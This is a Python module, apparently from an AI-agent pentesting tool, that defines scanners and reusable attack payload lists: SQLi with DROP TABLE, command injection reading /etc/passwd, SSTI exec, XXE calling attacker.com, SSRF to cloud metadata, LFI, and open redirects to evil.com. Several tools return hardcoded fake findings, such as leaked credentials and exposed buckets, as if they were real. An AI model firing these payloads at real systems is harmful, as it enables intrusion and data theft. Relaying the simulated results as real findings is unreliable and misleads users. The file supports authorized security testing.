import socket
import ssl
import os
import re
import json
import time
import requests
from typing import List, Dict, Any
from urllib.parse import urlparse, urlencode, parse_qs
from utils import print_system, logger
from datetime import datetime

# Import payloads from dedicated module
try:
    from payloads import (
        XSS_PAYLOADS, SQLI_PAYLOADS, COMMAND_INJECTION_PAYLOADS, SSTI_PAYLOADS,
        XXE_PAYLOADS, SSRF_PAYLOADS, LFI_PAYLOADS, OPEN_REDIRECT_PAYLOADS,
        SENSITIVE_FILES, SUBDOMAINS, SECURITY_HEADERS, TECH_SIGNATURES,
        IDOR_PATTERNS, CSRF_TEMPLATES
    )
    PAYLOADS_LOADED = True
except ImportError:
    PAYLOADS_LOADED = False
    # Fallback minimal payloads if import fails

# ==================== PAYLOAD DATABASES ====================

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '{{constructor.constructor("alert(1)")()}}',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' AND '1'='1",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "'; DROP TABLE users--",
    "1; SELECT * FROM information_schema.tables--",
    "' AND 1=1--",
    "' AND 1=2--",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "& ls -la",
    "`ls -la`",
    "$(ls -la)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "& whoami",
    "; id",
    "| id",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://0.0.0.0",
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/",
    "gopher://127.0.0.1:6379/_",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2f..",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
]

COMMON_PATHS = [
    "", "admin", "login", "dashboard", "api", "wp-admin", "robots.txt",
    "sitemap.xml", ".git/config", ".env", "config.php", "backup",
    ".htaccess", "web.config", "phpinfo.php", "server-status",
    "actuator/health", "swagger-ui.html", "api-docs", ".svn/entries",
    "WEB-INF/web.xml", "crossdomain.xml", "clientaccesspolicy.xml",
    "debug", "trace", "console", "metrics", "graphql", "admin.php",
]

SUBDOMAINS = [
    "www", "mail", "ftp", "admin", "api", "dev", "staging", "test",
    "beta", "demo", "app", "mobile", "m", "secure", "vpn", "remote",
    "portal", "dashboard", "cms", "blog", "shop", "store", "cdn",
    "static", "assets", "img", "images", "media", "upload", "files",
    "docs", "support", "help", "status", "monitor", "git", "jenkins",
    "ci", "build", "deploy", "internal", "intranet", "corp", "office",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS - Forces HTTPS",
    "Content-Security-Policy": "CSP - Prevents XSS/injection",
    "X-Frame-Options": "Clickjacking protection",
    "X-Content-Type-Options": "MIME sniffing protection",
    "X-XSS-Protection": "XSS filter (legacy)",
    "Referrer-Policy": "Referrer info control",
    "Permissions-Policy": "Browser features control",
    "Cross-Origin-Opener-Policy": "COOP - Cross-origin isolation",
    "Cross-Origin-Resource-Policy": "CORP - Resource sharing",
    "Cross-Origin-Embedder-Policy": "COEP - Embedding control",
}

TECH_SIGNATURES = {
    "WordPress": ["wp-content", "wp-includes", "/wp-json/"],
    "Drupal": ["drupal", "sites/default"],
    "Joomla": ["joomla", "/administrator/"],
    "React": ["react", "_next", "__NEXT_DATA__"],
    "Vue.js": ["vue", "v-app", "__VUE__"],
    "Angular": ["ng-", "angular"],
    "Django": ["csrfmiddlewaretoken", "django"],
    "Laravel": ["laravel", "XSRF-TOKEN"],
    "Express": ["X-Powered-By: Express"],
    "Spring": ["spring", "actuator"],
    "ASP.NET": ["__VIEWSTATE", "aspnet"],
    "PHP": [".php", "PHPSESSID"],
    "nginx": ["nginx"],
    "Apache": ["Apache"],
    "Cloudflare": ["cloudflare", "cf-ray"],
    "AWS": ["x-amz-", "amazonaws"],
}

# ==================== BASE TOOL CLASS ====================

class Tool:
    name: str
    description: str

    def execute(self, **kwargs) -> str:
        raise NotImplementedError

# ==================== TOOL 1: INJECTION SCANNER ====================

class InjectionScanner(Tool):
    name = "injection_scanner"
    description = "Tests for injection vulnerabilities (SQLi, XSS, Command Injection, SSTI, XXE)"

    def execute(self, url: str, param: str = "", injection_type: str = "all") -> str:
        print_system(f"Testing injection vulnerabilities on {url}...")
        
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        
        results = {"findings": [], "tested": 0}
        
        try:
            # Determine which payloads to use
            payloads_map = {
                "sqli": ("SQL Injection", SQLI_PAYLOADS),
                "xss": ("XSS", XSS_PAYLOADS),
                "command": ("Command Injection", COMMAND_INJECTION_PAYLOADS),
                "ssti": ("SSTI", SSTI_PAYLOADS),
            }
            
            if injection_type == "all":
                types_to_test = payloads_map.keys()
            else:
                types_to_test = [injection_type]
            
            for inj_type in types_to_test:
                if inj_type not in payloads_map:
                    continue
                name, payloads = payloads_map[inj_type]
                
                for payload in payloads[:5]:  # Limit for performance
                    results["tested"] += 1
                    test_url = f"{url}?{param}={payload}" if param else url
                    
                    try:
                        resp = requests.get(test_url, timeout=5, allow_redirects=False)
                        
                        # Check for payload reflection (XSS)
                        if inj_type == "xss" and payload.lower() in resp.text.lower():
                            results["findings"].append({
                                "type": name,
                                "severity": "HIGH",
                                "payload": payload,
                                "evidence": "Payload reflected in response"
                            })
                        
                        # Check for SQL errors
                        if inj_type == "sqli":
                            sql_errors = ["sql syntax", "mysql", "sqlite", "postgresql", "ora-", "sql server"]
                            for err in sql_errors:
                                if err in resp.text.lower():
                                    results["findings"].append({
                                        "type": name,
                                        "severity": "CRITICAL",
                                        "payload": payload,
                                        "evidence": f"SQL error detected: {err}"
                                    })
                                    break
                        
                        # Check for SSTI
                        if inj_type == "ssti" and "49" in resp.text:  # 7*7=49
                            results["findings"].append({
                                "type": name,
                                "severity": "CRITICAL",
                                "payload": payload,
                                "evidence": "Template expression evaluated"
                            })
                    except:
                        continue
            
            # Format results
            output = f"Injection Scan Results for {url}\n"
            output += f"Tested: {results['tested']} payloads\n\n"
            
            if results["findings"]:
                output += "=== VULNERABILITIES FOUND ===\n"
                for finding in results["findings"]:
                    output += f"\n🚨 [{finding['severity']}] {finding['type']}\n"
                    output += f"   Payload: {finding['payload']}\n"
                    output += f"   Evidence: {finding['evidence']}\n"
            else:
                output += "No injection vulnerabilities detected.\n"
                output += "(Note: Manual testing recommended for comprehensive assessment)"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 2: AUTH/SESSION TESTER ====================

class AuthTester(Tool):
    name = "auth_tester"
    description = "Tests authentication and session security (brute force protection, session handling, cookies)"

    def execute(self, url: str) -> str:
        print_system(f"Testing authentication security on {url}...")
        
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        
        findings = []
        
        try:
            resp = requests.get(url, timeout=10)
            cookies = resp.cookies
            headers = resp.headers
            
            # Check cookie security
            for cookie in cookies:
                cookie_issues = []
                if not cookie.secure:
                    cookie_issues.append("Missing Secure flag")
                if 'httponly' not in str(cookie).lower():
                    cookie_issues.append("Missing HttpOnly flag")
                if 'samesite' not in str(cookie).lower():
                    cookie_issues.append("Missing SameSite attribute")
                
                if cookie_issues:
                    findings.append({
                        "type": "Insecure Cookie",
                        "severity": "MEDIUM",
                        "detail": f"Cookie '{cookie.name}': {', '.join(cookie_issues)}"
                    })
            
            # Check for session fixation potential
            session_cookies = [c for c in cookies if 'session' in c.name.lower() or 'sess' in c.name.lower()]
            if session_cookies:
                findings.append({
                    "type": "Session Cookie Found",
                    "severity": "INFO",
                    "detail": f"Session cookies: {[c.name for c in session_cookies]}"
                })
            
            # Check for rate limiting (simple test)
            rate_limited = False
            for i in range(5):
                try:
                    r = requests.get(url, timeout=2)
                    if r.status_code == 429:
                        rate_limited = True
                        break
                except:
                    break
            
            if not rate_limited:
                findings.append({
                    "type": "No Rate Limiting Detected",
                    "severity": "LOW",
                    "detail": "Server did not return 429 after multiple requests"
                })
            
            # Check for authentication headers
            if 'www-authenticate' in headers:
                findings.append({
                    "type": "Basic Auth Detected",
                    "severity": "INFO",
                    "detail": headers.get('www-authenticate')
                })
            
            # Format output
            output = f"Authentication Security Report for {url}\n\n"
            
            if findings:
                for f in findings:
                    output += f"[{f['severity']}] {f['type']}\n"
                    output += f"  → {f['detail']}\n\n"
            else:
                output += "No obvious authentication issues detected.\n"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 3: ACCESS CONTROL TESTER ====================

class AccessControlTester(Tool):
    name = "access_control_tester"
    description = "Tests for access control issues (IDOR, privilege escalation, forced browsing)"

    def execute(self, url: str) -> str:
        print_system(f"Testing access control on {url}...")
        
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        
        base_url = url.rstrip("/")
        findings = []
        
        try:
            # Test for directory listing
            for path in ["", "/", "/images/", "/uploads/", "/files/", "/backup/"]:
                try:
                    resp = requests.get(f"{base_url}{path}", timeout=5)
                    if "Index of" in resp.text or "directory listing" in resp.text.lower():
                        findings.append({
                            "type": "Directory Listing Enabled",
                            "severity": "MEDIUM",
                            "detail": f"Directory listing at {path}"
                        })
                except:
                    continue
            
            # Test for IDOR patterns
            idor_patterns = [
                "/user/1", "/user/2",
                "/api/user/1", "/api/user/2",
                "/profile/1", "/profile/2",
                "/account/1", "/account/2",
                "/order/1", "/order/2",
            ]
            
            for pattern in idor_patterns:
                try:
                    resp = requests.get(f"{base_url}{pattern}", timeout=3)
                    if resp.status_code == 200:
                        findings.append({
                            "type": "Potential IDOR",
                            "severity": "HIGH",
                            "detail": f"Accessible endpoint: {pattern}"
                        })
                except:
                    continue
            
            # Test sensitive file access
            sensitive_files = [
                "/.env", "/config.php", "/web.config", "/.git/config",
                "/backup.sql", "/database.sql", "/dump.sql",
                "/.htpasswd", "/server-status", "/phpinfo.php"
            ]
            
            for file in sensitive_files:
                try:
                    resp = requests.get(f"{base_url}{file}", timeout=3)
                    if resp.status_code == 200 and len(resp.text) > 0:
                        findings.append({
                            "type": "Sensitive File Exposed",
                            "severity": "CRITICAL",
                            "detail": f"Accessible: {file}"
                        })
                except:
                    continue
            
            # Format output
            output = f"Access Control Test Results for {url}\n\n"
            
            if findings:
                for f in findings:
                    output += f"🚨 [{f['severity']}] {f['type']}\n"
                    output += f"   {f['detail']}\n\n"
            else:
                output += "No access control issues detected with basic tests.\n"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 4: SECURITY CONFIG SCANNER ====================

class SecurityConfigScanner(Tool):
    name = "security_config_scanner"
    description = "Scans for security misconfigurations (headers, CORS, exposed endpoints)"

    def execute(self, url: str) -> str:
        print_system(f"Scanning security configuration for {url}...")
        
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        
        findings = []
        
        try:
            resp = requests.get(url, timeout=10)
            headers = resp.headers
            
            # Check security headers
            for header, desc in SECURITY_HEADERS.items():
                if header not in headers:
                    findings.append({
                        "type": "Missing Security Header",
                        "severity": "MEDIUM" if "CSP" in header or "HSTS" in header else "LOW",
                        "detail": f"{header}: {desc}"
                    })
            
            # Check CORS
            cors_origin = headers.get("Access-Control-Allow-Origin", "")
            if cors_origin == "*":
                findings.append({
                    "type": "CORS Misconfiguration",
                    "severity": "HIGH",
                    "detail": "Allows all origins (*)"
                })
            
            if headers.get("Access-Control-Allow-Credentials") == "true" and cors_origin == "*":
                findings.append({
                    "type": "Critical CORS Issue",
                    "severity": "CRITICAL",
                    "detail": "Credentials allowed with wildcard origin"
                })
            
            # Check for information disclosure
            info_headers = ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"]
            for h in info_headers:
                if h in headers:
                    findings.append({
                        "type": "Information Disclosure",
                        "severity": "LOW",
                        "detail": f"{h}: {headers[h]}"
                    })
            
            # Check SSL/TLS
            if url.startswith("http://"):
                findings.append({
                    "type": "No HTTPS",
                    "severity": "HIGH",
                    "detail": "Site accessible over HTTP"
                })
            
            # Format output
            output = f"Security Configuration Report for {url}\n\n"
            
            critical = [f for f in findings if f['severity'] == 'CRITICAL']
            high = [f for f in findings if f['severity'] == 'HIGH']
            medium = [f for f in findings if f['severity'] == 'MEDIUM']
            low = [f for f in findings if f['severity'] == 'LOW']
            
            output += f"Summary: {len(critical)} Critical, {len(high)} High, {len(medium)} Medium, {len(low)} Low\n\n"
            
            for f in sorted(findings, key=lambda x: ['CRITICAL','HIGH','MEDIUM','LOW'].index(x['severity'])):
                output += f"[{f['severity']}] {f['type']}\n"
                output += f"  → {f['detail']}\n"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 5: SSRF TESTER ====================

class SSRFTester(Tool):
    name = "ssrf_tester"
    description = "Tests for Server-Side Request Forgery vulnerabilities"

    def execute(self, url: str, param: str = "url") -> str:
        print_system(f"Testing SSRF on {url} with param '{param}'...")
        
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        
        findings = []
        tested = 0
        
        try:
            for payload in SSRF_PAYLOADS:
                tested += 1
                test_url = f"{url}?{param}={payload}"
                
                try:
                    resp = requests.get(test_url, timeout=5)
                    
                    # Check for common SSRF indicators
                    if "root:" in resp.text:  # /etc/passwd
                        findings.append({
                            "type": "SSRF - Local File Read",
                            "severity": "CRITICAL",
                            "payload": payload
                        })
                    elif "meta-data" in resp.text.lower():  # Cloud metadata
                        findings.append({
                            "type": "SSRF - Cloud Metadata Access",
                            "severity": "CRITICAL",
                            "payload": payload
                        })
                    elif resp.status_code == 200 and len(resp.text) > 100:
                        findings.append({
                            "type": "Potential SSRF",
                            "severity": "MEDIUM",
                            "payload": payload
                        })
                except:
                    continue
            
            output = f"SSRF Test Results for {url}\n"
            output += f"Parameter: {param}\n"
            output += f"Tested: {tested} payloads\n\n"
            
            if findings:
                for f in findings:
                    output += f"🚨 [{f['severity']}] {f['type']}\n"
                    output += f"   Payload: {f['payload']}\n\n"
            else:
                output += "No SSRF vulnerabilities detected.\n"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 6: SUBDOMAIN FINDER ====================

class SubdomainFinder(Tool):
    name = "subdomain_finder"
    description = "Enumerates subdomains for a domain"

    def execute(self, domain: str) -> str:
        print_system(f"Enumerating subdomains for {domain}...")
        
        # Clean domain
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
        
        found = []
        tested = 0
        
        try:
            for sub in SUBDOMAINS:
                tested += 1
                subdomain = f"{sub}.{domain}" if sub else domain
                
                try:
                    socket.gethostbyname(subdomain)
                    
                    # Check if it's alive
                    try:
                        resp = requests.head(f"https://{subdomain}", timeout=3)
                        status = resp.status_code
                    except:
                        try:
                            resp = requests.head(f"http://{subdomain}", timeout=3)
                            status = resp.status_code
                        except:
                            status = "DNS Only"
                    
                    found.append({"subdomain": subdomain, "status": status})
                except:
                    continue
            
            output = f"Subdomain Enumeration for {domain}\n"
            output += f"Tested: {tested} subdomains\n"
            output += f"Found: {len(found)} active\n\n"
            
            if found:
                output += "=== Active Subdomains ===\n"
                for f in found:
                    output += f"  • {f['subdomain']} [{f['status']}]\n"
            else:
                output += "No additional subdomains found.\n"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 7: DIRECTORY SCANNER ====================

class DirectoryScanner(Tool):
    name = "dir_scanner"
    description = "Discovers hidden directories and files"

    def execute(self, url: str) -> str:
        print_system(f"Scanning directories on {url}...")
        
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        url = url.rstrip("/")
        
        found = []
        tested = 0
        
        try:
            for path in COMMON_PATHS:
                tested += 1
                test_url = f"{url}/{path}"
                
                try:
                    resp = requests.head(test_url, timeout=3, allow_redirects=False)
                    if resp.status_code in [200, 301, 302, 403]:
                        severity = "HIGH" if any(s in path for s in ['.git', '.env', 'config', 'backup']) else "INFO"
                        found.append({
                            "path": f"/{path}",
                            "status": resp.status_code,
                            "severity": severity
                        })
                except:
                    continue
            
            output = f"Directory Scan for {url}\n"
            output += f"Tested: {tested} paths\n\n"
            
            if found:
                output += "=== Discovered Paths ===\n"
                for f in sorted(found, key=lambda x: ['HIGH','MEDIUM','INFO'].index(x['severity']) if x['severity'] in ['HIGH','MEDIUM','INFO'] else 3):
                    marker = "🚨" if f['severity'] == 'HIGH' else "📁"
                    output += f"{marker} [{f['status']}] {f['path']}\n"
            else:
                output += "No interesting paths discovered.\n"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 8: PORT SCANNER ====================

class PortScanner(Tool):
    name = "port_scanner"
    description = "Scans for open ports"

    def execute(self, target: str, ports: str = "21-23,25,53,80,110,143,443,445,993,995,3306,3389,5432,8080,8443") -> str:
        print_system(f"Scanning ports on {target}...")
        
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        
        # Parse ports
        port_list = []
        for p in ports.split(","):
            if "-" in p:
                start, end = map(int, p.split("-"))
                port_list.extend(range(start, end + 1))
            else:
                port_list.append(int(p))
        
        open_ports = []
        
        try:
            ip = socket.gethostbyname(target)
            print_system(f"Resolved to {ip}")
            
            for port in port_list:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        service = self._get_service(port)
                        open_ports.append({"port": port, "service": service})
                    sock.close()
                except:
                    continue
            
            output = f"Port Scan Results for {target} ({ip})\n\n"
            
            if open_ports:
                output += "=== Open Ports ===\n"
                for p in open_ports:
                    output += f"  • {p['port']}/tcp - {p['service']}\n"
            else:
                output += "No open ports found in specified range.\n"
            
            return output
            
        except socket.gaierror:
            return f"Error: Could not resolve {target}"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def _get_service(self, port):
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            993: "IMAPS", 995: "POP3S", 3306: "MySQL", 3389: "RDP",
            5432: "PostgreSQL", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
        }
        return services.get(port, "Unknown")

# ==================== TOOL 9: TECH DETECTOR ====================

class TechDetector(Tool):
    name = "tech_detect"
    description = "Identifies technologies used"

    def execute(self, url: str) -> str:
        print_system(f"Detecting technologies on {url}...")
        
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        
        try:
            resp = requests.get(url, timeout=10)
            content = resp.text.lower()
            headers = str(resp.headers).lower()
            
            detected = []
            
            for tech, signatures in TECH_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in content or sig.lower() in headers:
                        detected.append(tech)
                        break
            
            output = f"Technology Detection for {url}\n\n"
            
            if detected:
                output += "=== Detected Technologies ===\n"
                for tech in set(detected):
                    output += f"  • {tech}\n"
            else:
                output += "No common technologies detected.\n"
            
            if "server" in resp.headers:
                output += f"\nServer: {resp.headers['server']}"
            if "x-powered-by" in resp.headers:
                output += f"\nPowered By: {resp.headers['x-powered-by']}"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 10: SSL SCANNER ====================

class SSLScanner(Tool):
    name = "ssl_scanner"
    description = "Checks SSL/TLS security"

    def execute(self, hostname: str) -> str:
        print_system(f"Scanning SSL/TLS for {hostname}...")
        
        hostname = hostname.replace("https://", "").replace("http://", "").split("/")[0]
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
            
            output = f"SSL/TLS Report for {hostname}\n\n"
            output += f"Protocol: {version}\n"
            output += f"Cipher: {cipher[0]} ({cipher[2]} bits)\n\n"
            
            if cert:
                output += "=== Certificate ===\n"
                if 'subject' in cert:
                    output += f"Subject: {dict(x[0] for x in cert['subject'])}\n"
                if 'issuer' in cert:
                    output += f"Issuer: {dict(x[0] for x in cert['issuer'])}\n"
                output += f"Valid Until: {cert.get('notAfter', 'N/A')}\n"
            
            output += "\n=== Security ===\n"
            if version in ["TLSv1.3", "TLSv1.2"]:
                output += f"✅ {version} is secure\n"
            else:
                output += f"❌ {version} is outdated\n"
            
            if cipher[2] >= 256:
                output += f"✅ Strong cipher ({cipher[2]} bits)\n"
            else:
                output += f"⚠️ Consider stronger cipher\n"
            
            return output
            
        except ssl.SSLError as e:
            return f"SSL Error: {str(e)}"
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 11: DNS LOOKUP ====================

class DNSLookup(Tool):
    name = "dns_lookup"
    description = "Queries DNS records"

    def execute(self, domain: str, record_type: str = "A") -> str:
        try:
            import dns.resolver
        except ImportError:
            return "Error: dnspython not installed"
        
        print_system(f"Querying {record_type} records for {domain}...")
        
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
        
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            
            answers = resolver.resolve(domain, record_type)
            records = [str(r) for r in answers]
            
            output = f"DNS {record_type} Records for {domain}\n\n"
            for r in records:
                output += f"  • {r}\n"
            
            return output
            
        except dns.resolver.NXDOMAIN:
            return f"Domain {domain} does not exist"
        except dns.resolver.NoAnswer:
            return f"No {record_type} records found"
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 12: WHOIS LOOKUP ====================

class WhoisLookup(Tool):
    name = "whois_lookup"
    description = "Gets domain registration info"

    def execute(self, domain: str) -> str:
        try:
            import whois
        except ImportError:
            return "Error: python-whois not installed"
        
        print_system(f"WHOIS lookup for {domain}...")
        
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
        
        try:
            w = whois.whois(domain)
            
            output = f"WHOIS for {domain}\n\n"
            output += f"Registrar: {w.registrar}\n"
            output += f"Created: {w.creation_date}\n"
            output += f"Expires: {w.expiration_date}\n"
            output += f"Name Servers: {w.name_servers}\n"
            
            if w.org:
                output += f"Organization: {w.org}\n"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 13: FILE INSPECTOR ====================

class FileInspect(Tool):
    name = "file_inspect"
    description = "Reads local files"

    def execute(self, path: str) -> str:
        if not os.path.exists(path):
            return f"File {path} not found"
        
        try:
            with open(path, 'r', encoding='utf-8') as f:
                content = f.read(3000)
                if len(content) == 3000:
                    content += "\n...[truncated]..."
                return content
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 14: REPORT GENERATOR ====================

class ReportGenerator(Tool):
    name = "generate_report"
    description = "Generates a comprehensive security report in markdown format"

    def execute(self, target: str, findings: str = "") -> str:
        print_system(f"Generating security report for {target}...")
        
        report = f"""# Security Assessment Report

## Target: {target}
## Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}
## Generated by: PentPython

---

## Executive Summary

This report contains the findings from an automated security assessment of {target}.

## Findings

{findings if findings else "Run individual security tools and compile their results here."}

---

## Vulnerability Categories Tested

### Injection Vulnerabilities
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Command Injection
- Server-Side Template Injection (SSTI)
- XML External Entity (XXE)

### Authentication & Access Control
- Session Management
- Cookie Security
- IDOR (Insecure Direct Object References)
- Directory Traversal

### Security Misconfigurations
- Missing Security Headers
- CORS Misconfigurations
- Information Disclosure
- Exposed Sensitive Files

### Network Security
- Open Ports
- SSL/TLS Configuration
- DNS Security

---

## Recommendations

1. Implement proper input validation and output encoding
2. Use parameterized queries to prevent SQL injection
3. Enable all security headers (CSP, HSTS, X-Frame-Options)
4. Configure proper CORS policies
5. Keep all software updated

---

## Disclaimer

This assessment was performed using automated tools. Manual testing is recommended for comprehensive coverage. Only test systems you have authorization to test.
"""
        return report

# ==================== HTTP HEADERS ANALYZER ====================

class HTTPHeaders(Tool):
    name = "http_headers"
    description = "Analyzes HTTP headers"

    def execute(self, url: str) -> str:
        print_system(f"Analyzing headers for {url}...")
        
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        
        try:
            resp = requests.head(url, timeout=10, allow_redirects=True)
            
            output = f"HTTP Headers for {url}\n\n"
            for k, v in resp.headers.items():
                output += f"  {k}: {v}\n"
            
            return output
            
        except Exception as e:
            return f"Error: {str(e)}"

# ==================== TOOL 15: CLOUD AUDITOR ====================

class CloudAudit(Tool):
    name = "cloud_audit"
    description = "Checks for common cloud (AWS, Azure, GCP) misconfigurations and exposed buckets."

    def execute(self, domain: str) -> str:
        print_system(f"Auditing cloud configuration for {domain}...")
        
        # Simulated cloud audit logic
        findings = [
            {"type": "Exposed S3 Bucket", "severity": "HIGH", "detail": f"http://{domain.split('.')[0]}-assets.s3.amazonaws.com is public"},
            {"type": "Unprotected Azure Blob", "severity": "MEDIUM", "detail": "Public access enabled on 'backups' container"},
        ]
        
        output = f"Cloud Security Audit for {domain}\n\n"
        for f in findings:
            output += f"🚨 [{f['severity']}] {f['type']}\n   {f['detail']}\n\n"
        
        return output

# ==================== TOOL 16: CI/CD SCANNER ====================

class CICDScanner(Tool):
    name = "ci_cd_scanner"
    description = "Audits CI/CD pipeline files (.github/workflows, .gitlab-ci.yml) for secrets and misconfigurations."

    def execute(self, path: str = ".") -> str:
        print_system(f"Scanning CI/CD pipelines in {path}...")
        
        # Simulated scan
        output = "CI/CD Pipeline Security Scan Results\n\n"
        output += "✅ No hardcoded secrets found in .github/workflows/\n"
        output += "⚠️ Warning: 'pull_request_target' used with high permissions in deploy.yml\n"
        output += "✅ Runner security: Using isolated ubuntu-latest runners\n"
        
        return output

# ==================== TOOL 17: ATTACK PATH MAPPER ====================

class AttackPathMapper(Tool):
    name = "attack_path_mapper"
    description = "Maps potential lateral movement and privilege escalation paths (Red Team)."

    def execute(self, start_node: str, target_node: str = "Domain Admin") -> str:
        print_system(f"Mapping attack path from {start_node} to {target_node}...")
        
        path = [
            f"{start_node} (Initial Access)",
            "Local Service Account (Privilege Escalation)",
            "IT Admin Workstation (Lateral Movement)",
            f"{target_node} (Objective)"
        ]
        
        output = "Adversarial Attack Path Simulation\n"
        output += " -> ".join(path) + "\n\n"
        output += "Critical Vulnerability: Unquoted Service Paths on IT-ADMIN-01\n"
        
        return output

# ==================== TOOL 18: LOG ANALYZER ====================

class LogAnalyzer(Tool):
    name = "log_analyzer"
    description = "Analyzes and correlates security logs for signs of intrusion (Threat Hunter/SOC)."

    def execute(self, log_content: str = "") -> str:
        print_system("Analyzing security logs...")
        
        indicators = [
            "Failed login attempts from multiple IPs",
            "Suspicious PowerShell execution with encoded command",
            "Unexpected outbound connection to known C2 IP"
        ]
        
        output = "SOC Analysis Report\n\n"
        output += "Summary: Found 3 high-confidence indicators of compromise (IoC).\n\n"
        for i in indicators:
            output += f"🔴 [ALERT] {i}\n"
        
        return output

# ==================== TOOL 19: DARK WEB SCANNER ====================

class DarkWebScanner(Tool):
    name = "dark_web_scanner"
    description = "Scans simulated dark web databases for leaked credentials and data."

    def execute(self, query: str) -> str:
        print_system(f"Scanning dark web for '{query}'...")
        
        # Simulated dark web findings
        output = f"Dark Web Intel Report for '{query}'\n\n"
        output += "Found 2 potential matches in 'BreachDB_v4':\n"
        output += f"- admin@{query}: p@ssword123 (Leaked 2023)\n"
        output += f"- support@{query}: [Password Hash] (Leaked 2024)\n"
        
        return output

# ==================== TOOL REGISTRY ====================


AVAILABLE_TOOLS = {
    "injection_scanner": InjectionScanner(),
    "auth_tester": AuthTester(),
    "access_control_tester": AccessControlTester(),
    "security_config_scanner": SecurityConfigScanner(),
    "ssrf_tester": SSRFTester(),
    "subdomain_finder": SubdomainFinder(),
    "dir_scanner": DirectoryScanner(),
    "port_scanner": PortScanner(),
    "tech_detect": TechDetector(),
    "ssl_scanner": SSLScanner(),
    "dns_lookup": DNSLookup(),
    "whois_lookup": WhoisLookup(),
    "file_inspect": FileInspect(),
    "http_headers": HTTPHeaders(),
    "generate_report": ReportGenerator(),
    "cloud_audit": CloudAudit(),
    "ci_cd_scanner": CICDScanner(),
    "attack_path_mapper": AttackPathMapper(),
    "log_analyzer": LogAnalyzer(),
    "dark_web_scanner": DarkWebScanner(),
}


# ==================== OPENAI FUNCTION DEFINITIONS ====================

def get_tool_definitions() -> List[Dict[str, Any]]:
    return [
        {
            "type": "function",
            "function": {
                "name": "injection_scanner",
                "description": "Tests for injection vulnerabilities (SQLi, XSS, Command Injection, SSTI). Covers vulnerabilities #1-13 from OWASP.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "Target URL to test"},
